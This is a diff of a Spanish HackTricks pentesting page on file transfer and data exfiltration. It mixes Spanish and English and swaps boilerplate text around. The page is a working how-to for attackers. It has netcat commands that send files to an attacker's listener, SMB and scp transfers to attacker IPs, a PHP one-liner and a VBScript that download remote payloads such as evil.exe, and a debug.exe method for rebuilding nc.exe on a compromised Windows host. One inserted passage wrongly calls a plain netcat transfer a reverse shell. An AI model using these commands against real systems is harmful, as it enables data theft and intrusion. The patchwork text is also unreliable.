@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén [**artículos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 
@@ -193,38 +193,23 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+Windows
 
-## Introduction
+---
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or leveraging legitimate services like Dropbox or Google Drive to exfiltrate data.
+### Exfiltration
 
-## Techniques
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-### Command and Control (C2) Channels
+1. **Email**: Sending data as email attachments.
+2. **FTP**: Transferring data using the File Transfer Protocol.
+3. **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
+4. **DNS**: Encoding data within DNS requests.
+5. **Steganography**: Hiding data within images or other files.
+6. **Cloud Storage**: Uploading data to cloud storage services.
+7. **Physical Media**: Copying data to removable storage devices.
 
-C2 channels are commonly used by attackers to exfiltrate data from compromised systems. These channels allow the attacker to maintain control over the compromised system and exfiltrate data without being detected.
-
-### DNS Exfiltration
-
-DNS exfiltration involves encoding data within DNS queries or responses to exfiltrate data from a target network. This technique can be used to bypass network security controls that may not inspect DNS traffic.
-
-### Cloud Storage Exfiltration
-
-Attackers can leverage cloud storage services like Dropbox or Google Drive to exfiltrate data from a target system. By uploading data to these services, attackers can easily retrieve the data from anywhere with an internet connection.
-
-## Tools and Resources
-
-There are various tools and resources available to facilitate data exfiltration, such as:
-
-- **Cobalt Strike**: A popular tool used by red teamers and attackers for post-exploitation activities, including data exfiltration.
-- **PowerShell Empire**: An open-source post-exploitation framework that includes modules for data exfiltration.
-- **Cloud Storage Services**: Legitimate cloud storage services like Dropbox, Google Drive, and OneDrive can be used for exfiltrating data.
-- **Custom Scripts**: Attackers can develop custom scripts to exfiltrate data based on their specific requirements.
-
-## Conclusion
-
-Exfiltration is a critical phase of the cyber attack lifecycle, allowing attackers to steal valuable data from target systems. By understanding the various exfiltration techniques and leveraging appropriate tools and resources, security professionals can better defend against data exfiltration attempts.
+It is important for attackers to choose exfiltration methods that are less likely to be detected by security measures in place.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -240,7 +225,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima al atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -248,17 +233,27 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Description
+### Exfiltration
 
-Netcat (nc) is a versatile networking utility that can be used for various purposes, including transferring files, port scanning, banner grabbing, and creating reverse shells. It operates by establishing a connection between a client and a server, allowing for data transfer between the two endpoints. Netcat is commonly used by hackers and penetration testers for exfiltrating data from a target network.
+#### Description
 
-### Detection
+The Netcat utility can be used for exfiltration by creating a reverse shell to send data from the target machine to the attacker's machine. This can be achieved by setting up a listener on the attacker's machine and then executing a command on the target machine to connect back to the listener.
 
-Detection of Netcat usage can be challenging due to its versatility and the fact that it is a legitimate tool used by system administrators for various network-related tasks. Monitoring network traffic for suspicious connections or unexpected data transfers may help in detecting potential misuse of Netcat.
+#### Usage
 
-### Prevention
+On the attacker's machine:
+```bash
+nc -lvp <port> > exfiltrated_data
+```
 
-To prevent unauthorized use of Netcat within a network, access controls should be implemented to restrict its usage to authorized personnel only. Regularly monitoring network traffic and conducting security audits can also help in identifying any unauthorized use of Netcat. Additionally, implementing network segmentation and strong firewall rules can limit the potential impact of Netcat usage for exfiltration purposes.
+On the target machine:
+```bash
+nc <attacker_ip> <port> < exfiltrated_data
+```
+
+#### Detection
+
+Monitoring network traffic for suspicious connections to and from the target machine can help detect exfiltration using Netcat. Additionally, monitoring for unusual outbound network connections from the target machine can also indicate potential data exfiltration.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -325,7 +320,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descarga un archivo con un PHP oneliner:
+Descargar un archivo con un PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -367,23 +362,21 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Esta es una técnica loca que funciona en máquinas Windows de 32 bits. La idea es utilizar el programa `debug.exe`. Se utiliza para inspeccionar binarios, como un depurador. Pero también puede reconstruirlos a partir de hexadecimal. Entonces la idea es tomar binarios, como `netcat`. Y luego desensamblarlo en hexadecimal, pegarlo en un archivo en la máquina comprometida, y luego ensamblarlo con `debug.exe`.
-
-`Debug.exe` solo puede ensamblar 64 kb. Por lo tanto, necesitamos usar archivos más pequeños que eso. Podemos usar upx para comprimirlo aún más. Así que hagámoslo:
-```
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-Ahora solo pesa 29 kb. Perfecto. Así que ahora vamos a desmontarlo:
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
+Luego copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Ahora simplemente copiamos y pegamos el texto en nuestra ventana de comandos de Windows. Y automáticamente creará un archivo llamado nc.exe
 
 Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
 
@@ -392,7 +385,7 @@ Encuentra las vulnerabilidades que más importan para que puedas solucionarlas m
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
